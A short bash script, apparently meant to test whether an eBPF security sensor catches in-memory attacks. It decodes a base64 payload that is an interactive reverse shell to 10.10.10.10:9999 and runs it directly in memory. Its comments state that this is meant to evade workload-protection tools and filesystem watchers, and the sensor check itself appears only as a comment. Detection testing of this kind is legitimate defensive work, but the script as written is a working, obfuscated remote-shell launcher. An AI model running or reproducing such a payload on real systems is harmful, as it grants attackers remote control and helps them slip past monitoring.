#!/bin/bash
# Advanced fileless payload execution avoiding disk writes
# Bypasses standard CWPP by living entirely in memory /dev/shm and using obfuscation

echo "Testing advanced eBPF evasion capabilities..."

# Base64 encoded payload that connects to a known C2 (Command & Control)
PAYLOAD="YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85OTk5IDA+JjE="

# Execute directly in memory, bypassing standard filesystem watchers
echo $PAYLOAD | base64 -d | sh &
EVASION_PID=$!

sleep 2
# Clean up purely for simulator stability
kill $EVASION_PID 2>/dev/null || true

# Check if eBPF Sensor correctly identified the obfuscated shell payload mapped into memory
echo "In-Memory payload discharged."
